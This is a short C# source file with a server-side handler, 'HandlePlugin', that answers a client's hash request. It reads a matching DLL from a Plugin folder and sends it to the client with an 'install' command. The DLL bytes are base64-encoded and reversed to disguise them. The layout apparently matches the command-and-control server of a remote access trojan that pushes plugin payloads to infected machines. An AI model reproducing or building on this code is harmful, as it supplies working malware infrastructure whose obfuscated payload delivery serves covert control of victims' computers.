using Server.Connection;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Windows.Forms;
using Server.Helper;
using Server.MessagePack;
using Microsoft.VisualBasic;

namespace Server.Handle_Packet
{
    public class HandlePlugin
    {
        public HandlePlugin(Clients client, string hash)
        {
            if (hash.Length == 32 && !hash.Contains("\\"))
            {
                foreach (string _hash in Directory.GetFiles(Path.Combine(Application.StartupPath, "Plugin")))
                {
                    if (hash == Methods.GetHash(_hash))
                    {
                        Console.WriteLine("Found: " + hash);
                        MsgPack msgPack = new MsgPack();
                        msgPack.ForcePathObject("Packet").AsString = "plugin";
                        msgPack.ForcePathObject("Command").AsString = "install";
                        msgPack.ForcePathObject("Hash").AsString = hash;
                        msgPack.ForcePathObject("Dll").AsString = Strings.StrReverse(Convert.ToBase64String(File.ReadAllBytes(_hash)));
                        client.Send(msgPack.Encode2Bytes());
                    }
                }
            }
        }
    }
}
